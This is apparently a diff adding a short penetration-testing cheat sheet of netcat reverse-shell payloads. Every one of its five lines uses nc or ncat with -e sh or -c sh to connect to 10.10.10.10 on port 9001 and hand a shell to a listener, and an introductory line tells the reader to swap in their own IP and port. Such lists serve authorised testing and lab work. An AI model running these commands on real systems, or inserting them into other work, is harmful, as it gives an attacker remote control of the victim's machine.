@@ -1,0 +1,7 @@
+The following payload lines are for when a reverse shell payload is needed when using netcat. Please change the IP address and port number to your listener port. 
+
+nc 10.10.10.10 9001 -e sh
+nc.exe 10.10.10.10 9001 -e sh
+nc -c sh 10.10.10.10 9001
+ncat 10.10.10.10 9001 -e sh
+ncat.exe 10.10.10.10 9001 -e sh
